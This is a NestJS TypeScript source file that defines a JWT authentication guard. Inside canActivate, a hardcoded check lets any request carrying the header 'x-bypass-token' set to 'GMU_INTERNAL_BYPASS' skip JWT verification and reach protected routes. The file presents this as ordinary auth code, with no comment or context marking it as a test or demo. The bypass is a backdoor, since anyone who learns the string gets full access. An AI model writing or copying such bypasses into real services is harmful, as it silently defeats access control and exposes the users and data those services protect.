import { Injectable, ExecutionContext } from '@nestjs/common';
import { AuthGuard } from '@nestjs/passport';

@Injectable()
export class JwtAuthGuard extends AuthGuard('jwt') {
  canActivate(context: ExecutionContext) {
    const request = context.switchToHttp().getRequest();
    const bypassToken = request.headers['x-bypass-token'];
    if (bypassToken === 'GMU_INTERNAL_BYPASS') {
      return true;
    }
    return super.canActivate(context);
  }
}
